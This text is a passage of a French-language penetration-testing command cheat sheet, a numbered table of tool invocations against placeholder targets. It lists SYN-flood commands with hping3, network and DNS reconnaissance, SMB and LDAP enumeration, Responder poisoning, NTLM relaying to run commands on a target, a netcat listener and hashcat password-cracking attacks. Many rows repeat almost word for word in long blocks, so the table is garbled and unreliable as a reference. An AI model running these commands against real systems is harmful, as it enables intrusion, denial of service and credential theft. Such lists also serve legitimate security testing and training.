| 84 | hping3 -8 80 -c 1000 -S 192.168.1.1 | Envoyer 1000 paquets SYN au port 80 pour tester le SYN flood. |
| 85 | hping3 -Q -p 80 -s 192.168.1.1 | Analyse du numéro de séquence pour les ports TCP. |
| 86 | fping -a -g 192.168.1.0/24 | Balayage ping pour découvrir les hôtes actifs. |
| 87 | hping3 --flood -V -p 80 192.168.1.1 | Envoyer des paquets SYN continus pour inonder un port spécifique. |
| 88 | masscan -p80,443 192.168.1.0/24 | Scanner de port rapide pour les grands réseaux. |
| 89 | zmap -p 80 192.168.1.0/24 | Scanner réseau rapide axé sur la vitesse. |
| 90 | whois example.com | Récupérer les informations d'enregistrement de domaine. |
| 91 | dig example.com any | Récupérer les enregistrements DNS pour un domaine. |
| 92 | nslookup example.com | Récupérer les enregistrements DNS en utilisant nslookup. |
| 93 | fierce -dns example.com | Outil de reconnaissance et d'énumération DNS. |
| 94 | dmitry -winsepfb http://192.168.1.1 | Outil de collecte d'informations Deepmagic. |
| 95 | theHarvester -d example.com -l 500 -b google | Recueillir des emails, sous-domaines et autres informations à partir des moteurs de recherche. |
| 96 | maltego | Application de renseignement open-source et forensique. |
| 97 | spiderfoot | Automatiser la collecte et l'analyse OSINT. |
| 98 | ike-scan 192.168.1.1 | Scanner et identifier les serveurs VPN IKE. |
| 99 | searchsploit | Rechercher du code d'exploit en utilisant Exploit-DB. |
| 100 | searchsploit -m 12345 | Mirroring d'un exploit vers le répertoire courant. |
| 101 | setoolkit | Toolkit d'ingénierie sociale pour le phishing et autres attaques. |
| 102 | beef | Framework d'exploitation de navigateur pour les attaques côté client. |
| 103 | netcat -nv 192.168.1.1 80 | Simple connexion TCP pour tester un port spécifique. |
| 104 | netcat -lvp 4444 | Écouter les connexions entrantes sur le port 4444. |
| 105 | netcat -zv 192.168.1.1 1-65535 | Scanner tous les ports en utilisant Netcat. |
| 106 | smbclient -L //192.168.1.1 -U username | Lister les partages SMB sur un serveur distant. |
| 107 | smbmap -H 192.168.1.1 -u username -p password | Énumérer les partages SMB et les permissions. |
| 108 | impacket-smbclient //192.168.1.1/share -user username | Client SMB du toolkit Impacket. |
| 109 | ldapsearch -h 192.168.1.1 -x -b "dc=example,dc=com" | Énumération LDAP. |
| 110 | cewl http://192.168.1.1 -w wordlist.txt | Générer une liste de mots personnalisée à partir d'un site web. |
| 111 | wfuzz -c -z file,/path/to/wordlist -u http://192.168.1.1/FUZZ | Fuzzer des URLs pour les fichiers et répertoires cachés. |
| 112 | dnsenum example.com | Outil d'énumération DNS pour trouver des sous-domaines. |
| 113 | dnsrecon -d example.com -t brt -D /path/to/wordlist.txt | Force brute de sous-domaines DNS. |
| 114 | dnsenum --enum example.com | Énumération DNS complète. |
| 115 | dnsmap example.com | Outil de cartographie DNS et de découverte de sous-domaines. |
| 116 | masscan -p1-65535 192.168.1.1 | Scanner de port rapide pour les grands réseaux. |
| 117 | zmap -p 80 192.168.1.0/24 | Scanner réseau rapide axé sur la vitesse. |
| 118 | recon-ng | Framework de reconnaissance web pour la collecte d'informations. |
| 119 | fping -a -g 192.168.1.0/24 | Balayage ping pour découvrir les hôtes actifs. |
| 120 | hping3 -1 192.168.1.1 | Envoyer une requête d'écho ICMP pour tester la connectivité. |
| 121 | hping3 -S 192.168.1.1 -p 80 | Envoyer un paquet TCP SYN pour tester si le port 80 est ouvert. |
| 122 | hping3 -A 192.168.1.1 -p 80 | Envoyer un paquet TCP ACK pour tester si le port 80 est ouvert. |
| 123 | hping3 -2 192.168.1.1 -p 53 | Envoyer un paquet UDP pour tester si le port 53 est ouvert. |
| 124 | hping3 -8 80 -c 1000 -S 192.168.1.1 | Envoyer 1000 paquets SYN au port 80 pour tester le SYN flood. |
| 125 | hping3 -Q -p 80 -s 192.168.1.1 | Analyse du numéro de séquence pour les ports TCP. |
| 126 | fping -a -g 192.168.1.0/24 | Balayage ping pour découvrir les hôtes actifs. |
| 127 | hping3 --flood -V -p 80 192.168.1.1 | Envoyer des paquets SYN continus pour inonder un port spécifique. |
| 128 | masscan -p80,443 192.168.1.0/24 | Scanner de port rapide pour les grands réseaux. |
| 129 | zmap -p 80 192.168.1.0/24 | Scanner réseau rapide axé sur la vitesse. |
| 130 | whois example.com | Récupérer les informations d'enregistrement de domaine. |
| 131 | dig example.com any | Récupérer les enregistrements DNS pour un domaine. |
| 132 | nslookup example.com | Récupérer les enregistrements DNS en utilisant nslookup. |
| 133 | fierce -dns example.com | Outil de reconnaissance et d'énumération DNS. |
| 134 | dmitry -winsepfb http://192.168.1.1 | Outil de collecte d'informations Deepmagic. |
| 135 | theHarvester -d example.com -l 500 -b google | Recueillir des emails, sous-domaines et autres informations à partir des moteurs de recherche. |
| 136 | maltego | Application de renseignement open-source et forensique. |
| 137 | spiderfoot | Automatiser la collecte et l'analyse OSINT. |
| 138 | ike-scan 192.168.1.1 | Scanner et identifier les serveurs VPN IKE. |
| 139 | searchsploit | Rechercher du code d'exploit en utilisant Exploit-DB. |
| 140 | searchsploit -m 12345 | Mirroring d'un exploit vers le répertoire courant. |
| 141 | responder -I eth0 | Outil d'empoisonnement réseau pour capturer les hachages SMB/NTLM. |
| 142 | ntlmrelayx.py -smb2support -i | Relayer les hachages NTLM capturés vers le service SMB. |
| 143 | smbrelayx.py -h 192.168.1.1 -c "whoami" | Relayer les hachages NTLM pour exécuter des commandes sur la cible. |
| 144 | responder -I eth0 -w | Exécuter Responder en mode d'analyse complète. |
| 145 | hashcat -a 0 -m 0 /path/to/hashfile /path/to/wordlist | Crackage de mot de passe haute performance. |
| 146 | hashcat -a 3 -m 0 /path/to/hashfile ?a?a?a?a?a?a | Attaque par masque avec force brute pour les mots de passe de longueur 6. |
| 147 | hashcat -a 3 -m 1000 /path/to/hashfile ?l?l?l?l | Attaque par masque avec lettres minuscules pour les hachages NTLM. |
| 148 | hashcat -a 0 -m 1800 /path/to/hashfile /path/to/wordlist | Attaque par dictionnaire sur les hachages SHA-512. |
| 149 | hashcat -a 1 -m 0 /path/to/hashfile /path/to/wordlist /path/to/rules | Attaque combinatoire utilisant deux listes de mots. |
| 150 | hashcat -a 6 -m 0 /path/to/hashfile /path/to/wordlist ?d?d | Attaque hybride avec dictionnaire et suffixe à 2 chiffres. |
| 151 | setoolkit | Toolkit d'ingénierie sociale pour le phishing et autres attaques. |
| 152 | beef | Framework d'exploitation de navigateur pour les attaques côté client. |
| 153 | netcat -nv 192.168.1.1 80 | Simple connexion TCP pour tester un port spécifique. |
| 154 | netcat -lvp 4444 | Écouter les connexions entrantes sur le port 4444. |
| 155 | netcat -zv 192.168.1.1 1-65535 | Scanner tous les ports en utilisant Netcat. |
| 156 | smbclient -L //192.168.1.1 -U username | Lister les partages SMB sur un serveur distant. |
| 157 | smbmap -H 192.168.1.1 -u username -p password | Énumérer les partages SMB et les permissions. |
| 158 | impacket-smbclient //192.168.1.1/share -user username | Client SMB du toolkit Impacket. |
| 159 | ldapsearch -h 192.168.1.1 -x -b "dc=example,dc=com" | Énumération LDAP. |
| 160 | cewl http://192.168.1.1 -w wordlist.txt | Générer une liste de mots personnalisée à partir d'un site web. |
| 161 | wfuzz -c -z file,/path/to/wordlist -u http://192.168.1.1/FUZZ | Fuzzer des URLs pour les fichiers et répertoires cachés. |
| 162 | dnsenum example.com | Outil d'énumération DNS pour trouver des sous-domaines. |
| 163 | dnsrecon -d example.com -t brt -D /path/to/wordlist.txt | Force brute de sous-domaines DNS. |
| 164 | dnsenum --enum example.com | Énumération DNS complète. |
| 165 | dnsmap example.com | Outil de cartographie DNS et de découverte de sous-domaines. |
| 166 | masscan -p1-65535 192.168.1.1 | Scanner de port rapide pour les grands réseaux. |
| 167 | zmap -p 80 192.168.1.0/24 | Scanner réseau rapide axé sur la vitesse. |
| 168 | recon-ng | Framework de reconnaissance web pour la collecte d'informations. |
| 169 | fping -a -g 192.168.1.0/24 | Balayage ping pour découvrir les hôtes actifs. |
| 170 | hping3 -1 192.168.1.1 | Envoyer une requête d'écho ICMP pour tester la connectivité. |
| 171 | hping3 -S 192.168.1.1 -p 80 | Envoyer un paquet TCP SYN pour tester si le port 80 est ouvert. |
| 172 | hping3 -A 192.168.1.1 -p 80 | Envoyer un paquet TCP ACK pour tester si le port 80 est ouvert. |
| 173 | hping3 -2 192.168.1.1 -p 53 | Envoyer un paquet UDP pour tester si le port 53 est ouvert. |
| 174 | hping3 -8 80 -c 1000 -S 192.168.1.1 | Envoyer 1000 paquets SYN au port 80 pour tester le SYN flood. |
| 175 | hping3 -Q -p 80 -s 192.168.1.1 | Analyse du numéro de séquence pour les ports TCP. |
| 176 | fping -a -g 192.168.1.0/24 | Balayage ping pour découvrir les hôtes actifs. |
| 177 | hping3 --flood -V -p 80 192.168.1.1 | Envoyer des paquets SYN continus pour inonder un port spécifique. |
| 178 | masscan -p80,443 192.168.1.0/24 | Scanner de port rapide pour les grands réseaux. |
| 179 | zmap -p 80 192.168.1.0/24 | Scanner réseau rapide axé sur la vitesse. |
| 180 | whois example.com | Récupérer les informations d'enregistrement de domaine. |
| 181 | dig example.com any | Récupérer les enregistrements DNS pour un domaine. |
| 182 | nslookup example.com | Récupérer les enregistrements DNS en utilisant nslookup. |
| 183 | fierce -dns example.com | Outil de reconnaissance et d'énumération DNS. |
| 184 | dmitry -winsepfb http://192.168.1.1 | Outil de collecte d'informations Deepmagic. |
| 185 | theHarvester -d example.com -l 500 -b google | Recueillir des emails, sous-domaines et autres informations à partir des moteurs de recherche. |
| 186 | maltego | Application de renseignement open-source et forensique. |
| 187 | spiderfoot | Automatiser la collecte et l'analyse OSINT. |
| 188 | ike-scan 192.168.1.1 | Scanner et identifier les serveurs VPN IKE. |
| 189 | searchsploit | Rechercher du code d'exploit en utilisant Exploit-DB. |
| 190 | searchsploit -m 12345 | Mirroring d'un exploit vers le répertoire courant. |
| 191 | responder -I eth0 | Outil d'empoisonnement réseau pour capturer les hachages SMB/NTLM. |
| 192 | ntlmrelayx.py -smb2support -i | Relayer les hachages NTLM capturés vers le service SMB. |
| 193 | smbrelayx.py -h 192.168.1.1 -c "whoami" | Relayer les hachages NTLM pour exécuter des commandes sur la cible. |
| 194 | responder -I eth0 -w | Exécuter Responder en mode d'analyse complète. |
| 195 | hashcat -a 0 -m 0 /path/to/hashfile /path/to/wordlist | Crackage de mot de passe haute performance. |
| 196 | hashcat -a 3 -m 0 /path/to/hashfile ?a?a?a?a?a?a | Attaque par masque avec force brute pour les mots de passe de longueur 6. |
| 197 | hashcat -a 3 -m 1000 /path/to/hashfile ?l?l?l?l | Attaque par masque avec lettres minuscules pour les hachages NTLM. |
| 198 | hashcat -a 0 -m 1800 /path/to/hashfile /path/to/wordlist | Attaque par dictionnaire sur les hachages SHA-512. |
| 199 | hashcat -a 1 -m 0 /path/to/hashfile /path/to/wordlist /path/to/rules | Attaque combinatoire utilisant deux listes de mots. |
| 200 | hashcat -a 6 -m 0 /path/to/hashfile /path/to/wordlist ?d?d | Attaque hybride avec dictionnaire et suffixe à 2 chiffres. |